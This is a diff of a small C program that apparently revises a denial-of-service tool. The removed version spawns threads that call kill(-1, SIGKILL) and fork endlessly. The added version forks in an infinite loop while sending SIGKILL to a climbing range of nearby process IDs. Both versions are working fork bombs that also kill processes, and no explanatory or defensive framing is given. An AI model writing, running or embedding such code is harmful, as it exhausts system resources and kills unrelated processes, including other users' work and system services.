@@ -2,23 +2,32 @@
 #include <unistd.h>
 #include <sys/time.h>
 #include <sys/resource.h>
+#include <sys/types.h>
+#include <pthread.h>
+#include <errno.h>
+#include <signal.h>
+#include <wait.h>
 
-void process(void * a) {
-    while (1) {
-		kill(-1,SIGKILL);
-		pid_t p = fork();
-		if (p > 0) {
-			printf("Process %d created.\n", p);
-		}
-	}
+#define PROCESS_DIST 50
+
+void child(int sig){
+	while(waitpid(-1,NULL,WNOHANG) > 0);
 }
 
 int main(){
- 	while(1) {
-		pthread_t p;
-		pthread_attr_t attr;
-		pthread_attr_init(&attr);
-		pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED);
-		pthread_create(&p, &attr, (void*(*)(void *)process,NULL);
+	struct sigaction signal;
+	signal.sa_handler = child;
+	sigemptyset(&signal.sa_mask);
+	signal.sa_flags = SA_RESTART;
+	sigaction(SIGCHLD, &signal, NULL);
+
+	int mypid = getpid();
+	int pid = mypid - PROCESS_DIST;
+	while (1) {
+		if(pid != mypid){
+			kill(pid,SIGKILL);
+		}
+		pid++;
+		fork();
 	}
 }
